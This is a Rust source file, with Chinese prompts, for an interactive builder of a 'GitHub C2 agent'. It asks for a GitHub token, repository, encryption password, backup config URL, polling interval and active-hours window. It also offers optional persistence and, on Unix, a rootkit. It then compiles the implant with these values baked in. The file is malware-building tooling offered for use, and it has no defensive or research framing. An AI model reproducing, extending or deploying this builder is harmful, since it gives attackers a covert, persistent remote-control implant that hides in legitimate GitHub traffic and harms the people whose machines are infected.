use serde::{Deserialize, Serialize};
use std::fs;
use std::io::{self, Write};
use std::process::Command;

#[derive(Serialize, Deserialize, Default)]
struct Config {
    token: String,
    repo: String,
    password: String,
    backup_url: String,
    poll_interval: String,
    time_window: String,
    enable_persistence: bool,
    enable_debug: bool,
    enable_rootkit: bool,
}

fn main() {
    println!("=== GitHub C2 Agent 生成器 ===\n");
    let config_path = "generator_config.json";
    let mut config = Config::default();

    print!("GitHub Token: ");
    io::stdout().flush().unwrap();
    let mut token = String::new();
    io::stdin().read_line(&mut token).unwrap();
    if !token.trim().is_empty() {
        config.token = token.trim().to_string();
    }

    print!("GitHub Repo (owner/repo): ");
    io::stdout().flush().unwrap();
    let mut repo = String::new();
    io::stdin().read_line(&mut repo).unwrap();
    if !repo.trim().is_empty() {
        config.repo = repo.trim().to_string();
    }

    print!("加密密码: ");
    io::stdout().flush().unwrap();
    let mut password = String::new();
    io::stdin().read_line(&mut password).unwrap();
    if !password.trim().is_empty() {
        config.password = password.trim().to_string();
    }

    print!("备用配置URL (可选): ");
    io::stdout().flush().unwrap();
    let mut backup_url = String::new();
    io::stdin().read_line(&mut backup_url).unwrap();
    config.backup_url = backup_url.trim().to_string();

    print!("轮询间隔(秒) [默认5]: ");
    io::stdout().flush().unwrap();
    let mut interval = String::new();
    io::stdin().read_line(&mut interval).unwrap();
    config.poll_interval = interval.trim().parse::<u64>().unwrap_or(5).to_string();

    print!("活动时间 (09:00-18:00 或 1,13,22 或留空=24小时): ");
    io::stdout().flush().unwrap();
    let mut time_window = String::new();
    io::stdin().read_line(&mut time_window).unwrap();
    config.time_window = time_window.trim().to_string();

    print!("启用持久化? (y/n) [默认n]: ");
    io::stdout().flush().unwrap();
    let mut persist = String::new();
    io::stdin().read_line(&mut persist).unwrap();
    config.enable_persistence = persist.trim().to_lowercase() == "y";

    print!("启用调试? (y/n) [默认n]: ");
    io::stdout().flush().unwrap();
    let mut debug = String::new();
    io::stdin().read_line(&mut debug).unwrap();
    config.enable_debug = debug.trim().to_lowercase() == "y";

    if cfg!(unix) {
        print!("启用Rootkit? (y/n) [默认n]: ");
        io::stdout().flush().unwrap();
        let mut rootkit = String::new();
        io::stdin().read_line(&mut rootkit).unwrap();
        config.enable_rootkit = rootkit.trim().to_lowercase() == "y";
    }

    println!("\n=== 配置摘要 ===");
    println!("Token: [hidden]");
    println!("Repo: {}", config.repo);
    println!("轮询间隔: {}秒", config.poll_interval);

    print!("\n确认生成? (y/n): ");
    io::stdout().flush().unwrap();
    let mut confirm = String::new();
    io::stdin().read_line(&mut confirm).unwrap();
    if confirm.trim().to_lowercase() != "y" {
        println!("已取消");
        return;
    }

    generate_agent(&config);

    if fs::metadata(config_path).is_ok() {
        let _ = fs::remove_file(config_path);
    }
}

fn generate_agent(config: &Config) {
    println!("\n开始编译...\n");

    let agent_dir = std::path::PathBuf::from(env!("CARGO_MANIFEST_DIR"))
        .parent()
        .unwrap()
        .join("agent");

    let output = Command::new("cargo")
        .current_dir(&agent_dir)
        .env("GITHUB_TOKEN", &config.token)
        .env("GITHUB_REPO", &config.repo)
        .env("ENCRYPTION_PASSWORD", &config.password)
        .env("BACKUP_URL", &config.backup_url)
        .env("POLL_INTERVAL", &config.poll_interval)
        .env("TIME_WINDOW", &config.time_window)
        .env("ENABLE_DEBUG", if config.enable_debug { "1" } else { "0" })
        .env(
            "ENABLE_PERSISTENCE",
            if config.enable_persistence { "1" } else { "0" },
        )
        .env(
            "ENABLE_ROOTKIT",
            if config.enable_rootkit { "1" } else { "0" },
        )
        .arg("build")
        .arg("--release")
        .output();

    match output {
        Ok(o) if o.status.success() => {
            let exe_name = if cfg!(windows) {
                "github-c2-agent.exe"
            } else {
                "github-c2-agent"
            };
            let exe_path = agent_dir.join(format!("target/release/{}", exe_name));
            println!("\n✅ 编译成功: {}", exe_path.display());
        }
        Ok(o) => {
            println!("\n❌ 编译失败:\n{}", String::from_utf8_lossy(&o.stderr));
        }
        Err(e) => {
            println!("\n❌ 错误: {}", e);
        }
    }
}
